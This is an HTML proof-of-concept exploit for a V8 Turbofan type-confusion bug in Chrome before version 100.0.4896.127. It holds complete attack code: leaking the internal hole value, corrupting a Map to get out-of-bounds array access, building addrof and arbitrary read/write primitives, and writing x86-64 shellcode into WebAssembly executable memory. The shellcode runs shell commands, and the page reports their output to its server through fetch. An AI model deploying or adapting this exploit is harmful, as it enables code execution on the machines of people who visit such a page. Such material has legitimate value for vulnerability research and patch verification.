<!-- 
    รง - Type confusion in V8 Turbofan in Google Chrome prior to 100.0.4896.127
    Author: ajxchapman
    
    References:
    * https://bugs.chromium.org/p/chromium/issues/detail?id=1315901
-->
<html>
<body>
    <img src="/test.img?delay=10" />
    <pre id="log" style="white-space: pre-wrap; word-wrap: break-word;"></pre>
    <script>
        const _consolelog = console.log;
        console.log = (...msg) => {
            _consolelog(...msg);
            document.getElementById('log').innerText += msg.join(' ') + '\n';
            fetch(`/?msg=${encodeURIComponent(msg.join(' '))}`);
        }

        function init(offsets, version) {
            let target_version = version || typeof navigator != 'undefined' ? navigator.userAgent.match(/Chrome.([^ ]+)/)[1] : version();
            let resulting_offsets = { ...offsets, version: target_version };
            let version_offsets = offsets;
            for (let x of target_version.split(".")) {
                version_offsets = version_offsets[x] || {};
                for (let key of Object.keys(version_offsets)) {
                    resulting_offsets[key] = version_offsets[key];
                }
            }
            return resulting_offsets;
        }

        // # Utility functions
        var arr_buf = new ArrayBuffer(8);
        var f64_arr = new Float64Array(arr_buf);
        var b64_arr = new BigInt64Array(arr_buf);

        function ftoi(f) {
            f64_arr[0] = f;
            return b64_arr[0];
        }

        function itof(i) {
            b64_arr[0] = i;
            return f64_arr[0];
        }

        function to_hex(val, width = 16) {
            let _v = typeof val == 'bigint' ? val : (Number.isSafeInteger(val) ? BigInt(val) : ftoi(val));
            _v = _v >= 0 ? _v : 0x10000000000000000n + _v;
            return '0x' + _v.toString(16).padStart(width, '0');
        }

        function post(shellcode) {
            let shbuf = new ArrayBuffer(4096);
            let shbuf8 = new Uint8Array(shbuf);
            let shbuf64 = new BigInt64Array(shbuf);

            let ret = shellcode(shbuf8);
            let data = new TextDecoder().decode(shbuf8);

            switch(Number(ret)) {
                case -1:
                    console.log(`[-] ${ret}: Sandbox enabled! :-(`);
                    break;
                case -2:
                    console.log(`[-] ${ret}: Unknown error`);
                    break;
                case 1:
                    console.log(`[-] ${ret}: Shellcode not executed`);
                    break;
                case 512: // String output
                    console.log('Output:');
                    console.log(Array.from(data.matchAll(/[ -~]+/g)).map(e => '\t' + e[0]).join('\n'));
                    break;
                case 1024: // Binary Output
                    console.log('Data:');
                    console.log('\t', data);
                    console.log('Strings:')
                    console.log(Array.from(data.matchAll(/[ -~]+/g)).map(e => '\t' + e[0]).join('\n'));
                    break;
                default:
                    console.log(`[+] ${ret}: Sandbox disabled!!1!`);
            }
        }
    </script>
    <script>
const offsets = {
    bucket_count:           17,
    objarr_index0_offset:   7,
    rwarr_backing_offset:   20,
    instance_rwx_addr:      0x60,
    base_pointer:           0x24,
    external_pointer:       0x20,
};


var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module);
var main = instance.exports.main;

function ComputeUnseededHash(key) {
    let hash = (key < 0 ? 0x100000000 - key : key) & 0xffffffff;
    hash = ((hash ^ 0xffffffff) + (hash << 15)) & 0xffffffff;
    hash = (hash ^ (hash >> 12 & 0x000fffff));
    hash = (hash + (hash << 2)) & 0xffffffff;
    hash = (hash ^ (hash >> 4 & 0x0fffffff));
    hash = (hash * 2057) & 0xffffffff;
    hash = (hash ^ (hash >> 16 & 0x0000ffff));
    hash = (hash & 0x3fffffff) & 0xffffffff;
    return hash;
}

function foo(bug) {
    function C(z) {
        Error.prepareStackTrace = function(t, B) {
        return B[z].getThis();
        };
        let p = Error().stack;
        Error.prepareStackTrace = null;
        return p;
    }
    function J() {}
    var optim = false;
    var opt = new Function(
        'a', 'b', 'c',
        'if(typeof a===\'number\'){if(a>2){for(var i=0;i<100;i++);return;}b.d(a,b,1);return}' +
            'g++;'.repeat(70));
    var e = null;
    J.prototype.d = new Function(
        'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');
    J.prototype.a = new Function('a', 'a.b(0,a)');
    J.prototype.b = new Function(
        'a', 'b',
        'b.c();if(a){' +
            'g++;'.repeat(70) + '}');
    J.prototype.c = function() {
        if (optim) {
        var z = C(3);
        var p = C(3);
        z[0] = 0;
        e = {M: z, C: p};
        }
    };
    var a = new J();
    // jit optim
    if (bug) {
        for (var V = 0; 1E4 > V; V++) {
        opt(0 == V % 4 ? 1 : 4, a, 1);
        }
    }
    optim = true;
    opt(1, a, 1);
    return e;
}

e2 = foo(true);
delete e2.M[0];
let hole = e2.C[0];
var map = new Map();
let arrs = [];

map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);

let oobarr = new Array(); oobarr.push(1.1, 1.2, 1.3);
let objarr = new Array(); objarr.push(new Object(), new Object(), new Object());
let crw_arr = new Array(); crw_arr.push(2.1, 2.2, 2.3);

map.set(offsets.bucket_count, -1);
let bucket_key = 1024;
while (true) {
    bucket_key += 1;
    let hash = ComputeUnseededHash(bucket_key);
    if ((hash & (offsets.bucket_count - 1)) == 0) {
        break;
    }
}    
map.set(bucket_key, 0x4141);

function addrof(obj) {
    objarr[0] = obj;
    return ftoi(oobarr[offsets.objarr_index0_offset]) & 0xffffffffn;
}

function compressed_read(addr) {
    let v = (ftoi(oobarr[offsets.rwarr_backing_offset]) & 0xffffffffn) + (BigInt(addr) << 32n);
    let old = oobarr[offsets.rwarr_backing_offset];
    oobarr[offsets.rwarr_backing_offset] = itof(v);

    let r = crw_arr[0];
    oobarr[offsets.rwarr_backing_offset] = old;
    return r;
}

function compressed_write(addr, value) {
    let v = BigInt(addr) << 32n;
    let old = oobarr[offsets.rwarr_backing_offset];
    oobarr[offsets.rwarr_backing_offset] = itof(v);
    
    crw_arr[0] = itof(value);
    oobarr[offsets.rwarr_backing_offset] = old;
}

let rwx_addr = compressed_read(addrof(instance) + BigInt(offsets.instance_rwx_addr));
console.log(`Address of oobarr:`, to_hex(addrof(oobarr), 8));
console.log(`Address of objarr:`, to_hex(addrof(objarr), 8));
console.log(`Address of crw_arr:`, to_hex(addrof(crw_arr), 8));
console.log(`Address of rwx mem:`, to_hex(rwx_addr));

function arb_write(rwx_addr, data) {
    let rw_arr = new Uint8Array(1024);

    compressed_write(addrof(rw_arr) + BigInt(offsets.base_pointer), 0n);
    compressed_write(addrof(rw_arr) + BigInt(offsets.external_pointer), ftoi(rwx_addr));

    for (let i = 0; i < data.length; i++) {
        rw_arr[i] = data[i];
    }
}

let shellcode = [
    0x48, 0x8b, 0x44, 0x24, 0x58, 0x48, 0xff, 0xc8, 0x48, 0x83, 0xc0, 0x28, 0x48, 0x8b, 0x00, 0x4c, 0x8b, 0x18, 0x48, 0x89, 0xc3, 0x6a, 0x00, 0xb8, 0x16, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe7, 0x0f, 0x05, 0x41, 0x59, 0x45, 0x89, 0xc8, 0x49, 0xc1, 0xe9, 0x20, 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x39, 0x00, 0x00, 0x00, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xcf, 0x0f, 0x05, 0xba, 0x00, 0x10, 0x00, 0x00, 0x48, 0x31, 0xc0, 0x4c, 0x89, 0xc7, 0x48, 0x89, 0xde, 0x0f, 0x05, 0x48, 0x01, 0xc3, 0x29, 0xc2, 0x48, 0x85, 0xc0, 0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xc7, 0x0f, 0x05, 0x68, 0x00, 0x02, 0x00, 0x00, 0x58, 0xc3, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xcf, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xc7, 0x0f, 0x05, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xcf, 0x0f, 0x05, 0x31, 0xc0, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x83, 0xc8, 0x00, 0x50, 0x31, 0xc0, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x83, 0xc8, 0x00, 0x50, 0xb8, 0x2f, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x54, 0x41, 0x58, 0x31, 0xc0, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x83, 0xc8, 0x00, 0x50, 0x31, 0xc0, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x2d, 0x63, 0x00, 0x00, 0x50, 0x54, 0x41, 0x59, 0x31, 0xc0, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x83, 0xc8, 0x00, 0x50, 0x31, 0xc0, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x65, 0x3b, 0x00, 0x00, 0x50, 0xb8, 0x70, 0x74, 0x69, 0x6d, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x65, 0x3b, 0x20, 0x75, 0x50, 0xb8, 0x20, 0x64, 0x61, 0x74, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x20, 0x2d, 0x61, 0x3b, 0x50, 0xb8, 0x6e, 0x61, 0x6d, 0x65, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x64, 0x3b, 0x20, 0x75, 0x50, 0xb8, 0x3b, 0x20, 0x70, 0x77, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x6e, 0x61, 0x6d, 0x65, 0x50, 0xb8, 0x68, 0x6f, 0x73, 0x74, 0x48, 0xc1, 0xe0, 0x20, 0x48, 0x0d, 0x69, 0x64, 0x3b, 0x20, 0x50, 0x54, 0x41, 0x5a, 0x6a, 0x00, 0x41, 0x52, 0x41, 0x51, 0x41, 0x50, 0x54, 0x41, 0x5a, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xd6, 0x48, 0x8b, 0x3e, 0x48, 0x31, 0xd2, 0x0f, 0x05, 0xc3, 
];
arb_write(rwx_addr, shellcode);
post(main);
    </script>
</body>
</html>
